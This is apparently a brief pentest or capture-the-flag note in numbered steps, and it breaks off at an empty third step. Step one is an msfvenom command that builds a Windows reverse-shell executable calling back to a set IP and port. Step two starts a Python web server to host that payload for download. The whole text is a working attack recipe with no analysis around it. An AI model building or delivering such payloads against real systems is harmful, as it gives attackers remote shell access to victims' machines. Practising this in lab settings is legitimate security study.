1. make revshell exe file
   
   ```
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.168.139 LPORT=6969 -f exe > weinrev.exe
   ```
2. Run a python server on this directory
   ```
   python3 -m http.server 80
   ```
3. 
